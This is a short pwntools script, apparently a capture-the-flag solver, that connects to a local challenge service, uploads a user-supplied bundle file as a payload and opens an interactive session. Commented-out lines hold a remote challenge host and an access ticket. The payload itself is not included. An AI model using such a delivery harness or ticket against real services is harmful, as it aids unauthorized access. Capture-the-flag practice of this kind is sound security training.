from pwn import *
import os
import sys

# Creating the git file.

# Create the directory structure if it doesn't exist

# Connect to localhost on port 5555
# port = 10001
# remotey = "nicicd-amygexkc6fakw.shellweplayaga.me" 
# connection = remote(remotey, port)
# ticket = "ticket{DaisyWhiskers3097n25:mcK3I21LILL-gVH3c09b9VS1XmG4ygRoY6-GWDUQGtLakC-V}"
# connection.recvuntil(b"please:")  # Wait for the server to ask for the file
# connection.sendline(ticket.encode())
connection = remote('localhost', 5555)
# Enable debug logging for pwntools
# context.log_level = 'debug'
# Example interaction
print(connection.recvuntil(b"file:"))  # Receive a line from the server

# Open the payload file and read its content
if len(sys.argv) != 2:
    print("Usage: python solve.py <path_to_bundle>")
    sys.exit(1)

bundle_path = sys.argv[1]

with open(bundle_path, 'rb') as f:
    payload = f.read()

# Send the length of the payload to the server
connection.sendline(str(len(payload)).encode())

connection.recvuntil(b"]:")  # Wait for the server to ask for the file
# Send the payload to the server
connection.send(payload)
connection.interactive()  # Keep the connection open for interaction

# Close the connection
connection.close()